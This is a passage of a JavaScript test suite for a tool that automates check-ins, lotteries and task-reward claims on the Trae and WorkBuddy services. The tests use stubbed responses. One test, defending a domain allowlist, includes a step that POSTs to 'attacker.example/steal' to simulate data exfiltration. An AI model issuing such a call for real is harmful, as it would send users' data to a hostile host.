    // 被拒的那些一个都不许留下账号：uid 是靠花子请求解出来的，
    // 校验必须发生在建号之前，否则拒掉的输入会留下半个账号
    assert.equal([...kv.store.keys()].filter((k) => k.startsWith("v1:acct:trae:")).length, 2);
  } finally { stub.restore(); }
});

test("[trae] 域名白名单：两家自家放行，别的一律拒", async () => {
  const kv = fakeKv();
  seedTrae(kv, "991005");
  const stub = stubUpstream({ "POST /trae/api/v2/ug/checkin_credits/status": statusOf(false, 0) });
  try {
    const tool = { ...findTool("trae") };
    tool.steps = [{ id: "x", label: "越界", cost: 1, async run(ctx) { await ctx.fetch("https://attacker.example/steal", { method: "POST", body: "{}" }); return { status: "ok", message: "不该走到这里" }; } }];
    const { summary } = await tickWith(kv, [tool], 45, cst(10));
    assert.equal(planOf(summary, "trae").accounts[0].status, "error");
    assert.match(planOf(summary, "trae").accounts[0].message, /禁止的请求域名/);
    assert.ok(stub.seen.every((r) => r.host === TRAE_OAUTH || r.host === TRAE_CLAIM));
  } finally { stub.restore(); }
});

// ═══════════ WorkBuddy ═══════════
//
// 这一家的测试重点不是"能不能跑通"，而是三件旧代码吃过账的事：
// 登录失效不能被读成"今天已签过"、幂等键必须可重放、一轮做不完时必须整步顺延。

const WB_HOST = "copilot.tencent.com";

function seedWorkbuddy(kv, uid = "wb-77002", { exp = cst(60), expiresAt, wrapped } = {}) {
  kv.store.set("v1:tool:workbuddy", "{}");
  const token = wrapped
    ? JSON.stringify({ "$wbEncrypted": 1, envelope: mkJwt({ sub: uid, exp }) })
    : mkJwt({ sub: uid, exp });
  kv.store.set(`v1:acct:workbuddy:${uid}`, JSON.stringify({
    label: `WB 主号-${uid}`,
    cred: {
      accessToken: token,
      refreshToken: "rt-wb-old-XXXXXXXX",
      expiresAt: String(expiresAt === undefined ? cst(200) : expiresAt),
    },
    createdAt: 1, updatedAt: 1,
  }));
  kv.store.set("v1:schedidx:workbuddy", JSON.stringify({ day: null, entries: {} }));
  return uid;
}

const wbTool = () => findTool("workbuddy");
const wbTick = (kv, now = cst(10), limit = 45) => tickWith(kv, [wbTool()], limit, now);
const wbView = (summary) => planOf(summary, "workbuddy").accounts[0];

const wbStatus = (over = {}) => ({ payload: { active: true, today_checked_in: false, credits: 0, ...over } });
// 默认桩：一轮 7 步全部走通的"无事可做"版本
const wbIdleRoutes = (over = {}) => ({
  "POST /v2/billing/meter/checkin-activity-status": wbStatus({ today_checked_in: true }),
  "GET /v2/activity/growth/buddy/travel/status": { payload: { state: "traveling" } },
  "GET /v2/activity/growth/lottery/chances": { payload: { balance: 0 } },
  "GET /v2/activity/growth/buddy/quota": { payload: { affordable: 0 } },
  "GET /v2/activity/growth/tasks": { payload: { tasks: [] } },
  "GET /v2/activity/growth/energy": { payload: { balance: 5 } },
  "GET /v2/activity/growth/streak": { payload: { streak: { days: 3 } } },
  ...over,
});

test("[workbuddy] 401 必须排在「空 body 算已领」前面", async () => {
  // 上游把 daily-checkin 设计成"空 body = 今天已领"。于是登录失效返回的 401 + 空 body
  // 会被同一条判据读成"今天签过了"并返回成功 —— 旧代码注释里专门记了这一条
  const kv = fakeKv();
  const uid = seedWorkbuddy(kv);
  const stub = stubUpstream({ "POST /v2/billing/meter/checkin-activity-status": { status: 401, body: "" } });
  try {
    const { summary } = await wbTick(kv);
    assert.equal(wbView(summary).status, "login_required");
    assert.equal(kv.store.has(`v1:schedidx:workbuddy`) && JSON.parse(kv.store.get("v1:schedidx:workbuddy")).entries[uid].lastStatus, "login_required");
  } finally { stub.restore(); }
});

test("[workbuddy] 空 body / code 10001 / 含「已签」都判今日已领；credit:0 仍是领到", async () => {
  const cases = [
    [{ status: 400, payload: { code: 10001, msg: "今天已签到，请明天再来" } }, "already"],
    [{ status: 200, body: "" }, "already"],
    [{ status: 200, payload: { credit: 0 } }, "claimed"],
    [{ status: 200, payload: { credit: 120 } }, "claimed"],
  ];
  for (const [claimRoute, expected] of cases) {
    const kv = fakeKv();
    seedWorkbuddy(kv);
    const stub = stubUpstream({
      ...wbIdleRoutes({ "POST /v2/billing/meter/checkin-activity-status": wbStatus() }),
      "POST /v2/billing/meter/daily-checkin": claimRoute,
    });
    try {
      const { summary } = await wbTick(kv);
      assert.equal(wbView(summary).steps[0].status, expected, `领取响应 ${JSON.stringify(claimRoute)} 被判错`);
    } finally { stub.restore(); }
  }
});

test("[workbuddy] active=false 是活动未开，不是已领也不是失败", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({ "POST /v2/billing/meter/checkin-activity-status": { payload: { active: false } } }));
  try {
    const { summary } = await wbTick(kv);
    assert.equal(wbView(summary).steps[0].status, "inactive");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/daily-checkin")).length, 0);
  } finally { stub.restore(); }
});

test("[workbuddy] 幂等键按 (账号, 逻辑日, 序号) 派生：同轮内不重复、跨轮换键", async () => {
  const day = logicalDay(0, cst(10));
  const key = (d, i) => idemKey("draw", "wb-77002", d, i);
  assert.equal(key(day, 0), key(day, 0), "同一天同一序号必须是同一个键，否则重放就是再抽一次");
  assert.notEqual(key(day, 0), key(day, 1), "序号要进键：一轮里两次抽奖共键会被上游判成同一发");
  assert.notEqual(key(day, 0), key(logicalDay(0, cst(10) + 86400), 0), "换天了就得换键");

  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/lottery/chances": { payload: { balance: 2 } },
    "POST /v2/activity/growth/lottery/draw": { payload: { credit: 5 } },
  }));
  try {
    await wbTick(kv);
    const tokens = stub.seen.filter((r) => r.path.endsWith("/lottery/draw")).map((r) => JSON.parse(r.body).client_token);
    assert.equal(tokens.length, 2);
    assert.equal(new Set(tokens).size, 2, "同一轮两次抽奖共用了幂等键");
    assert.ok(tokens[0].startsWith("draw-"), tokens[0]);
    assert.ok(tokens[0].includes(day.replace(/-/g, "")), "逻辑日要进键，跨天才能自然换键");
  } finally { stub.restore(); }
});

test("[workbuddy] 到站礼物没领到就不派新行程", async () => {
  // 旧实现改成 idle 就派下一趟，那一趟的礼物会盖掉这次没领到的，等于白丢
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/buddy/travel/status": { payload: { state: "arrived", record_id: "rec-9", daily_limit_reached: false } },
    "POST /v2/activity/growth/buddy/travel/claim": { status: 500, body: "boom" },
    "GET /v2/activity/growth/buddy/travel/config": { payload: { locations: [{ id: "loc-1", name: "甲" }] } },
    "POST /v2/activity/growth/buddy/travel/depart": { payload: { ok: true } },
  }));
  try {
    const { summary } = await wbTick(kv);
    assert.equal(wbView(summary).steps[1].status, "error");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/travel/depart")).length, 0, "领取失败还派新行程");
  } finally { stub.restore(); }
});

// 2026-10-01 页面实测：accept_status 的合法值是 not_accepted / in_progress /
// accepted（已接领未完成）/ completed（完成待领）/ claimed（已领）。
// 旧实现按 progress.current >= target 猜完成度，把 completed 判成"还没领"去发 accept，
// 上游对已完成任务再接领一律 400 invalid request。
test("[workbuddy] 任务按 accept_status 分流：completed 才领，accepted/in_progress 不动", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/tasks": { payload: { tasks: [
      { task_code: "t-done", progress: { current: 5, target: 5 }, accept_status: "completed", has_reward: true, reward_credit: 999 },
      { task_code: "t-claimed", progress: { current: 3, target: 3 }, accept_status: "claimed", has_reward: true, reward_credit: 999 },
      { task_code: "t-accepted", progress: { current: 0, target: 1 }, accept_status: "accepted", has_reward: true, reward_credit: 999 },
      { task_code: "t-running", progress: { current: 1, target: 3 }, accept_status: "in_progress", has_reward: false, reward_credit: 0 },
    ] } },
    // 响应里的 credit 是 10，列表里的 reward_credit 是 999：两者必须能区分开。
    // 上游发多少就是多少，列表上的标称值只是"完成之后大概能给多少"的预告。
    "POST /activity/growth/tasks/t-done/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
  }));
  try {
    const { summary } = await wbTick(kv);
    const tasks = wbView(summary).steps[4];
    assert.equal(tasks.status, "claimed");
    assert.match(tasks.message, /领到 1 个任务奖励 \+10/, `状态机分流错了：${tasks.message}`);
    // 领奖端点：路径带 task_code、无 /v2、无请求体
    const claims = stub.seen.filter((r) => r.path.includes("/tasks/") && r.path.endsWith("/claim"));
    assert.equal(claims.length, 1, `只该给 t-done 发一次 claim，实际 ${claims.length} 次`);
    assert.equal(claims[0].method, "POST");
    assert.equal(claims[0].body, undefined, `claim 不该带请求体，实际 ${claims[0].body}`);
    // 已接领但没完成的（accepted）与进行中的都不许被当成可领
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/tasks/accept")).length, 0, "没有 not_accepted 的任务，不该发 accept");
    // 积分从 claim 响应读，不从任务列表的 reward_credit 猜
    assert.equal(wbView(summary).credits, 10);
  } finally { stub.restore(); }
});

test("[workbuddy] already_claimed 的任务不算领到：上游说不发奖就是不发，不能拿列表标称值充数", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/tasks": { payload: { tasks: [
      { task_code: "t-dup", progress: { current: 1, target: 1 }, accept_status: "completed", has_reward: true, reward_credit: 100 },
    ] } },
    // 200 且 code:0，但 already_claimed=true —— 上游认为已经发过了，这一轮没有新奖
    "POST /activity/growth/tasks/t-dup/claim": { payload: { code: 0, already_claimed: true, credit: 0, energy: 0 } },
  }));
  try {
    const { summary } = await wbTick(kv);
    const tasks = wbView(summary).steps[4];
    // 照实报"没领到"，而不是把列表里的 reward_credit=100 算成到手
    assert.equal(tasks.status, "error");
    assert.match(tasks.message, /t-dup 上游报已领过/, `already_claimed 没被识别：${tasks.message}`);
    assert.equal(wbView(summary).credits, 0, "上游没发奖就不该有积分");
  } finally { stub.restore(); }
});

// 2026-10-01 页面实测： Buddy_App_QQ 的 valid_end 是 2026-10-10、Expert_lighthouse 是 11-13。
// 过期还去 claim 的症状是 400，而用户从界面上看不出"过期"与"任务坏了"的区别。
test("[workbuddy] 过期与未上线的任务不领：打上游的只有还在窗口内的", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  // 时钟必须落在 10-10 之后：DAY 固定在 2026-09-30，那时 t-expired 还没过期，测不到东西。
  // 跨 11 天意味着令牌过期，会触发续期 —— 续期端点必须配好，否则 599（stub 的"没配这条路由"）
  // 会让整步在 guard 里就返回，看不到要验的东西。
  const afterExpiry = Date.UTC(2026, 9, 11, 2, 0) / 1000;   // CST 10:00
  const stub = stubUpstream(wbIdleRoutes({
    "POST /v2/plugin/auth/token/refresh": { payload: { access_token: mkJwt({ sub: "wb-u", exp: cst(200) }), refresh_token: "rt-rot", expires_in: 864000 } },
    "GET /v2/activity/growth/tasks": { payload: { tasks: [
      { task_code: "t-live", progress: { current: 1, target: 1 }, accept_status: "completed", has_reward: true, reward_credit: 10,
        valid_start: null, valid_end: "2026-12-31T23:59:00+08:00" },
      { task_code: "t-expired", progress: { current: 1, target: 1 }, accept_status: "completed", has_reward: true, reward_credit: 10,
        valid_start: null, valid_end: "2026-10-10T23:59:00+08:00" },
      { task_code: "t-locked", progress: { current: 0, target: 1 }, accept_status: "not_accepted", has_reward: true, reward_credit: 10,
        locked: true, valid_start: "2026-12-01T10:00:00+08:00", valid_end: null },
      { task_code: "t-forever", progress: { current: 1, target: 1 }, accept_status: "completed", has_reward: true, reward_credit: 10,
        valid_start: null, valid_end: null },
    ] } },
    "POST /activity/growth/tasks/t-live/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
    "POST /activity/growth/tasks/t-forever/claim": { payload: { code: 0, already_claimed: false, credit: 10, energy: 5 } },
  }));
  try {
    const { summary } = await wbTick(kv, afterExpiry);
    const claims = stub.seen.filter((r) => r.path.includes("/tasks/") && r.path.endsWith("/claim")).map((r) => r.path);
    const msg = wbView(summary).steps[4].message;
    assert.ok(claims.some((p) => p.includes("t-live")), `窗口内的 t-live 没领（${msg}）`);
    assert.ok(claims.some((p) => p.includes("t-forever")), `没有 valid_end 的 t-forever 不该被当成过期（${msg}）`);
    assert.ok(!claims.some((p) => p.includes("t-expired")), `过期任务被去 claim 了 —— 那是白打一次上游，可能被拒（${msg}）`);
    assert.ok(!claims.some((p) => p.includes("t-locked")), `未上线的任务被接领了（${msg}）`);
    assert.match(msg, /t-expired.*已过期/, `过期原因没进日志：${msg}`);
    assert.match(msg, /t-locked.*未到上线时间/, `未上线原因没进日志：${msg}`);
    // 无 valid_end 的不算"没有约束"，被误判成 1970 会把全部任务判成过期
    assert.ok(!msg.includes("t-forever"), `valid_end 缺失被当成过期了：${msg}`);
  } finally { stub.restore(); }
});

// 新账号必撞：没有 Buddy 实例时上游拒绝接领其余任务，报错原文只有 task_code。
// 这里守的是"要翻成人能照着做的话"，不是自动补前置（那是另一条业务链路，见 api.js 的理由）。
test("[workbuddy] 缺前置（first_buddy）要翻成可执行的话，不把上游原文抛给使用者", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/tasks": { payload: { tasks: [
      { task_code: "chat_5", progress: { current: 0, target: 5 }, accept_status: "not_accepted", has_reward: true, reward_credit: 100 },
    ] } },
    "POST /activity/growth/tasks/accept": { status: 400, payload: { code: 400, msg: "prerequisite not met: first_buddy (no buddy instance)" } },
  }));
  try {
    const { summary } = await wbTick(kv);
    const msg = wbView(summary).steps[4].message;
    assert.match(msg, /接领失败 HTTP 400/, msg);
    assert.match(msg, /领养第一只 Buddy/, `没翻成可执行的话：${msg}`);
    assert.ok(!msg.includes("no buddy instance"), `上游原文没被翻译：${msg}`);
  } finally { stub.restore(); }
});

// 顶层 code=0 不等于每个任务都登记成功：逐项结果在 data.results[].status。
// 谎报"已接领"会让下一轮看不出该重试什么 —— 症状是任务永远卡在 not_accepted。
test("[workbuddy] 接领不信任 200：逐项结果与回读都要对上，不许谎报已接领", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  let reads = 0;
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/tasks": () => {
      reads += 1;
      // 第一次读：两个 not_accepted。第二次读（回读）：t-a 已登记，t-b 仍是 not_accepted
      if (reads === 1) {
        return { payload: { tasks: [
          { task_code: "t-a", accept_status: "not_accepted", has_reward: true, progress: { current: 0, target: 1 } },
          { task_code: "t-b", accept_status: "not_accepted", has_reward: true, progress: { current: 0, target: 1 } },
        ] } };
      }
      return { payload: { tasks: [
        { task_code: "t-a", accept_status: "accepted", has_reward: true, progress: { current: 0, target: 1 } },
        { task_code: "t-b", accept_status: "not_accepted", has_reward: true, progress: { current: 0, target: 1 } },
      ] } };
    },
    // 顶层成功，但逐项里 t-b 失败 —— 这正是"200 不等于都成"的形态
    "POST /activity/growth/tasks/accept": { payload: { code: 0, data: { results: [
      { task_code: "t-a", status: "ok" },
      { task_code: "t-b", status: "failed", message: "prerequisite not met: first_buddy (no buddy instance)" },
    ] } } },
  }));
  try {
    const { summary } = await wbTick(kv);
    const msg = wbView(summary).steps[4].message;
    // 缺前置要翻成能照着做的话，不能只把上游原文 task_code 抛给使用者
    assert.match(msg, /t-b.*领养第一只 Buddy/, `逐项失败没报出可执行的原因：${msg}`);
    assert.ok(!msg.includes("prerequisite not met"), `上游原文没被翻译：${msg}`);
    assert.ok(!/已接领 2 个/.test(msg), `把部分失败说成全成功了：${msg}`);
  } finally { stub.restore(); }
});

test("[workbuddy] 上游不给逐项结果时靠回读确认：回读说没登记上就如实报", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  let reads = 0;
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/tasks": () => {
      reads += 1;
      if (reads === 1) {
        return { payload: { tasks: [
          { task_code: "t-x", accept_status: "not_accepted", has_reward: true, progress: { current: 0, target: 1 } },
          { task_code: "t-y", accept_status: "not_accepted", has_reward: true, progress: { current: 0, target: 1 } },
        ] } };
      }
      // 回读：只有 t-x 变了，t-y 还在 not_accepted —— 上游"请求成功但没登记"
      return { payload: { tasks: [
        { task_code: "t-x", accept_status: "accepted", has_reward: true, progress: { current: 0, target: 1 } },
        { task_code: "t-y", accept_status: "not_accepted", has_reward: true, progress: { current: 0, target: 1 } },
      ] } };
    },
    "POST /activity/growth/tasks/accept": { payload: { code: 0 } },   // 无 results
  }));
  try {
    const { summary } = await wbTick(kv);
    const msg = wbView(summary).steps[4].message;
    assert.match(msg, /回读只确认了 1\/2/, `回读没确认住却没如实报：${msg}`);
    assert.ok(!/已接领 2 个/.test(msg), `回读失败仍谎报全成：${msg}`);
  } finally { stub.restore(); }
});

test("[workbuddy] not_accepted 的任务批量接领：体是 task_codes 数组，发单数会被判非法", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/tasks": { payload: { tasks: [
      { task_code: "t-new1", progress: { current: 0, target: 1 }, accept_status: "not_accepted", has_reward: true, reward_credit: 10 },
      { task_code: "t-new2", progress: { current: 0, target: 1 }, accept_status: "not_accepted", has_reward: true, reward_credit: 10 },
      { task_code: "t-done", progress: { current: 1, target: 1 }, accept_status: "completed", has_reward: true, reward_credit: 7 },
    ] } },
    "POST /activity/growth/tasks/accept": { payload: { code: 0, data: { results: [
      { task_code: "t-new1", status: "ok" },
      { task_code: "t-new2", status: "ok" },
    ] } } },
    "POST /activity/growth/tasks/t-done/claim": { payload: { code: 0, already_claimed: false, credit: 7, energy: 5 } },
  }));
  try {
    const { summary } = await wbTick(kv);
    const accepts = stub.seen.filter((r) => r.path.endsWith("/tasks/accept"));
    assert.equal(accepts.length, 1, "两个 not_accepted 的任务该合并成一次批量接领");
    // 关键形状：数组。发 { task_code: "x" } 会被上游判 400 invalid request
    assert.deepEqual(JSON.parse(accepts[0].body).task_codes, ["t-new1", "t-new2"], "接领体必须是 task_codes 数组");
    const tasks = wbView(summary).steps[4];
    // 接领不发奖，所以积分只算 claim 那一笔
    assert.match(tasks.message, /已接领 2 个新任务/, `接领没被记进日志：${tasks.message}`);
    assert.equal(wbView(summary).credits, 7, "接领阶段的 reward_credit 是虚账，不能计入");
  } finally { stub.restore(); }
});

test("[workbuddy] 任务领取失败要把原因写进日志：只记「全部失败」查不出是谁拒的", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/tasks": { payload: { tasks: [
      { task_code: "t-gone", progress: { current: 3, target: 3 }, accept_status: "completed", has_reward: true, reward_credit: 10 },
    ] } },
    "POST /activity/growth/tasks/t-gone/claim": { status: 400, payload: { code: 10005, msg: "任务已下架" } },
  }));
  try {
    const { summary } = await wbTick(kv);
    const tasks = wbView(summary).steps[4];
    assert.equal(tasks.status, "error");
    assert.match(tasks.message, /t-gone HTTP 400 code=10005 任务已下架/, `失败原因没进日志：${tasks.message}`);

    // 部分失败也要带原因：领到 1 个、失败 1 个，两条信息同一条 message 里
    const kv2 = fakeKv();
    seedWorkbuddy(kv2, "wb-partial");
    const stub2 = stubUpstream(wbIdleRoutes({
      "GET /v2/activity/growth/tasks": { payload: { tasks: [
        { task_code: "t-ok", progress: { current: 1, target: 1 }, accept_status: "completed", has_reward: true, reward_credit: 5 },
        { task_code: "t-bad", progress: { current: 2, target: 2 }, accept_status: "completed", has_reward: true, reward_credit: 5 },
      ] } },
      "POST /activity/growth/tasks/t-ok/claim": { payload: { code: 0, already_claimed: false, credit: 5, energy: 5 } },
      "POST /activity/growth/tasks/t-bad/claim": { status: 403, payload: { msg: "frequency limit" } },
    }));
    try {
      const { summary: s2 } = await wbTick(kv2);
      const tasks2 = wbView(s2).steps[4];
      assert.equal(tasks2.status, "partial");
      assert.match(tasks2.message, /领到 1 个任务奖励 \+5/, tasks2.message);
      assert.match(tasks2.message, /失败：t-bad HTTP 403 frequency limit/, `部分失败的原因没进日志：${tasks2.message}`);
    } finally { stub2.restore(); }
  } finally { stub.restore(); }
});

test("[workbuddy] 连签兑换：409/403 是正常无事，天数不够报正常而不是活动未开", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/streak": { payload: { streak: { days: 15 } } },
    "POST /v2/activity/growth/redeem": (rec) => (JSON.parse(rec.body).tier === "7d"
      ? { status: 409, body: "already" }
      : { status: 403, body: "not enough" }),
  }));
  try {
    const { summary } = await wbTick(kv);
    const redeem = wbView(summary).steps[6];
    assert.equal(redeem.status, "ok");
    assert.match(redeem.message, /已换或不够/);
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/redeem")).length, 2, "15 天该解锁 7d 与 14d 两档");

    const cold = fakeKv();
    seedWorkbuddy(cold, "wb-cold");
    const stub2 = stubUpstream(wbIdleRoutes({ "GET /v2/activity/growth/streak": { payload: { streak: { days: 2 } } } }));
    try {
      const { summary: s2 } = await wbTick(cold);
      // 天数没到任何兑换档是常态（活动开着，只是没到档），报"正常"而不是"活动未开"
      assert.equal(wbView(s2).steps[6].status, "ok");
      assert.match(wbView(s2).steps[6].message, /还没到任何兑换档/);
      assert.equal(stub2.seen.filter((r) => r.path.endsWith("/redeem")).length, 0);
    } finally { stub2.restore(); }
  } finally { stub.restore(); }
});

test("[workbuddy] 积分挂在 6 个位置都要能取到：上游换版本就静默报 +0", async () => {
  // 旧实现逐个探测（worker.js:660 的 firstNum，注释写着「不同接口版本把积分挂在不同字段上」）。
  // 收窄成单路径的后果不是报错 —— 能量真扣了、状态是 claimed、界面显示成功，只有积分数对不上。
  const cases = [
    [{ code: 0, credit_amount: 7, results: [{ instance: { credit: 5 }, template: { credit: 3 } }] }, 7, "data 层 credit_amount"],
    [{ code: 0, credit_granted: 7, results: [{ instance: { credit: 5 } }] }, 7, "data 层 credit_granted"],
    [{ code: 0, reward_credit: 7, results: [{ instance: { credit: 5 } }] }, 7, "data 层 reward_credit"],
    [{ code: 0, results: [{ credit: 5 }] }, 5, "item 层 credit"],
    [{ code: 0, results: [{ instance: { credit: 5 } }] }, 5, "item.instance 层"],
    [{ code: 0, results: [{ template: { credit: 5 } }] }, 5, "item.template 层"],
    // 0 是合法的"这项没给"，必须继续往下探，不能停在 0 上
    [{ code: 0, credit_amount: 0, results: [{ instance: { credit: 5 } }] }, 5, "上一层给 0 时要继续探"],
  ];
  for (const [payload, expected, why] of cases) {
    const kv = fakeKv();
    seedWorkbuddy(kv);
    const stub = stubUpstream(wbIdleRoutes({
      "GET /v2/activity/growth/buddy/quota": { payload: { affordable: 1 } },
      "POST /v2/activity/growth/buddy/open": { payload },
    }));
    try {
      const { summary } = await wbTick(kv);
      assert.equal(wbView(summary).credits, expected, `${why}：能量已扣但积分记 ${wbView(summary).credits} 而不是 ${expected}`);
    } finally { stub.restore(); }
  }
});

test("[workbuddy] 抽奖/兑换给 0 的那层要跳过，不能被 ?? 短路吃掉后面的真值", async () => {
  // ?? 只挡 null/undefined。上游把"本项没给"写成 0 是常见形态，
  // `credit ?? reward_credit` 于是停在 0 上，12 分变成 0 分 —— 看着一切正常。
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/lottery/chances": { payload: { balance: 1 } },
    "POST /v2/activity/growth/lottery/draw": { payload: { code: 0, credit: 0, reward_credit: 12 } },
  }));
  try {
    const { summary } = await wbTick(kv);
    assert.match(wbView(summary).steps[2].message, /\+12/, `抽奖记 ${wbView(summary).steps[2].message}`);
  } finally { stub.restore(); }

  const kv2 = fakeKv();
  seedWorkbuddy(kv2);
  const stub2 = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/streak": { payload: { streak: { days: 8 } } },
    "POST /v2/activity/growth/redeem": { payload: { code: 0, credit_granted: 0, credit_amount: 20 } },
  }));
  try {
    const { summary: s2 } = await wbTick(kv2);
    assert.match(wbView(s2).steps[6].message, /7d \+20/, `兑换记 ${wbView(s2).steps[6].message}`);
  } finally { stub2.restore(); }
});

test("[workbuddy] 顶层字段是 null 时要能穿透到包装层取到真值", async () => {
  // 旧实现（worker.js:480）在命中即返回前明确跳过 null/undefined。
  // 少了这个判断：{state:null, data:{state:"arrived"}} 读出 null，
  // travel 于是走不进"到站领奖"分支，一次能白拿的到站礼物无声过期，
  // 而界面上看不出任何异常 —— 这正是最难发现的一类偏差。
  assert.equal(wbApi.dig({ state: null, data: { state: "arrived" } }, "state"), "arrived");
  assert.equal(wbApi.dig({ active: null, data: { active: true } }, "active"), true);
  // 顶层给 0 不该被跳过：dig 的职责是"取到那个值"，把 0 当成"没给"是 firstCredit 的活。
  // 混进 dig 会毁掉 active:false / today_checked_in:false 这类判据 —— 那两个 0/false 是有意义的。
  assert.equal(wbApi.dig({ credit: 0, data: { credit: 9 } }, "credit"), 0, "dig 遇到 0 就返回，跳过 0 会毁掉 active:false 的判据");
  // 包装层里没有才是真的没有
  assert.equal(wbApi.dig({ state: null, data: { other: 1 } }, "state"), null);

  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/buddy/travel/status": { payload: { state: null, data: { state: "arrived", record_id: "rec-n" } } },
    "POST /v2/activity/growth/buddy/travel/claim": { payload: { reward_credit: 8 } },
  }));
  try {
    const { summary } = await wbTick(kv);
    const travel = wbView(summary).steps[1];
    assert.equal(travel.status, "claimed", `顶层 null 让到站礼物没领到（实际 ${travel.status}：${travel.message}）`);
    assert.match(travel.message, /\+8/);
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/buddy/travel/claim")).length, 1, "到站了却没发领取请求");
    // 实测形状：到站领取不带任何参数，多传 record_id 属于自作多情
    const claimReq = stub.seen.find((r) => r.path.endsWith("/buddy/travel/claim"));
    assert.equal(claimReq.body, undefined, `到站领取不该带请求体，实际 ${claimReq.body}`);
  } finally { stub.restore(); }
});

test("[workbuddy] 一轮开几个盲盒由上游 max_open_count 决定，不是本地写死的 5", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  // affordable 给 500（能量很多），但上游说单轮只许开 2 个 —— 上限必须听上游的
  const stub = stubUpstream(wbIdleRoutes({
    "GET /v2/activity/growth/buddy/quota": { payload: { affordable: 500, max_open_count: 2 } },
    "POST /v2/activity/growth/buddy/open": { payload: { code: 0, results: [{ instance: { credit: 5 } }] } },
  }));
  try {
    const { summary } = await wbTick(kv);
    const blindbox = wbView(summary).steps[3];
    // affordable 500 但只开 2 个：剩下的下轮继续，所以是 partial 而不是 claimed
    assert.equal(blindbox.status, "partial");
    assert.match(blindbox.message, /开 2 个/, `没听上游的上限：${blindbox.message}`);
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/buddy/open")).length, 2, "能量 500 时不该按本地 5 个开满");

    // 上游没给 max_open_count 时回落到本地常量，不能因为读不到就放开手（每开一个真扣 10 能量）
    const kv2 = fakeKv();
    seedWorkbuddy(kv2, "wb-nocap");
    const stub2 = stubUpstream(wbIdleRoutes({
      "GET /v2/activity/growth/buddy/quota": { payload: { affordable: 500 } },
      "POST /v2/activity/growth/buddy/open": { payload: { code: 0, results: [{ instance: { credit: 5 } }] } },
    }));
    try {
      const { summary: s2 } = await wbTick(kv2);
      assert.equal(stub2.seen.filter((r) => r.path.endsWith("/buddy/open")).length, 5, "读不到上限时该回落到本地常量 5");
    } finally { stub2.restore(); }
  } finally { stub.restore(); }
});

test("[workbuddy] 一轮装不下 7 步时整步顺延，下一轮接着做而不是重做", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv);
  const stub = stubUpstream(wbIdleRoutes({
    "POST /v2/billing/meter/checkin-activity-status": wbStatus(),
    "POST /v2/billing/meter/daily-checkin": { payload: { credit: 100 } },
  }));
  try {
    // 19 = 够付停用标记 1 + 每工具 3 + 账号闸（框架 6 + 收尾余量 5）+ 签到那一步的 4，
    // 但下一步就装不下了。停用标记那 1 笔（FLAGS_FRAME）也在账上：调这个数字前先确认它还在。
    const first = await wbTick(kv, cst(10), 19);
    const view = wbView(first.summary);
    assert.equal(view.steps[0].status, "claimed");
    const deferred = view.steps.filter((s) => s.status === "deferred" || s.status === "skipped");
    assert.ok(deferred.length >= 5, `装不下的步骤该整步顺延，实际只有 ${deferred.length} 条`);
    assert.equal(schedEntryOf(kv, "workbuddy", "wb-77002").resumable, true, "没做完的轮次必须可接续");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/daily-checkin")).length, 1, "签到不能被做两次");

    kv.calls.length = 0;
    const lock = [...kv.store.keys()].find((k) => k.startsWith("v1:lock:workbuddy:"));
    if (lock) kv.store.delete(lock);
    const second = await wbTick(kv, cst(10, 31), 45);
    const steps2 = wbView(second.summary).steps;
    assert.equal(steps2[0].reused, true, "已完成的签到步骤该复用，不再打上游");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/daily-checkin")).length, 1, "复用轮不该再领一次");
    assert.ok(steps2.slice(1).some((s) => !["deferred", "skipped"].includes(s.status)), "后面的步骤这轮该真的开始做");
  } finally { stub.restore(); }
});

test("[workbuddy] 续期只写一次盘：7 个步骤共用同一个新串不能写 7 回", async () => {
  const kv = fakeKv();
  seedWorkbuddy(kv, "wb-rot", { expiresAt: cst(10) + 600 });   // 只剩 10 分钟 → 必然触发续期
  let refreshed = 0;
  const stub = stubUpstream({
    ...wbIdleRoutes(),
    "POST /v2/plugin/auth/token/refresh": () => {
      refreshed += 1;
      return { payload: { access_token: mkJwt({ sub: "wb-rot", exp: cst(200) }), refresh_token: "rt-wb-ROTATED", expires_in: 864000 } };
    },
  });
  try {
